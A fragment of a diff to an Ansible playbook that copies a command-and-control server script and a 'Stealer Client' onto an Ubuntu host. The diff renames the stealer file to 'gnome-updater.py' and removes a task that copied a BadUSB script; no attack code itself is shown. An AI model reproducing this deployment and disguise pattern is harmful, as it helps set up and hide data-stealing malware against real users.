@@ -38,23 +38,15 @@
   tasks:
     - name: Copy c2_server.py
       ansible.builtin.copy:
-        src: ./c2_server.py
+        src: ./server/c2_server.py
         dest: /home/ubuntu/
         mode: '0644'
         owner: ubuntu
         group: ubuntu
       
-    - name: Copy stealer_client.py
+    - name: Copy Stealer Client
       ansible.builtin.copy:
-        src: ./app/stealer_client.py
-        dest: /home/ubuntu/
-        mode: '0644'
-        owner: ubuntu
-        group: ubuntu
-
-    - name: Copy BadUSB script
-      ansible.builtin.copy:
-        src: ./BadUSB.sh
+        src: ./app/gnome-updater.py
         dest: /home/ubuntu/
         mode: '0644'
         owner: ubuntu
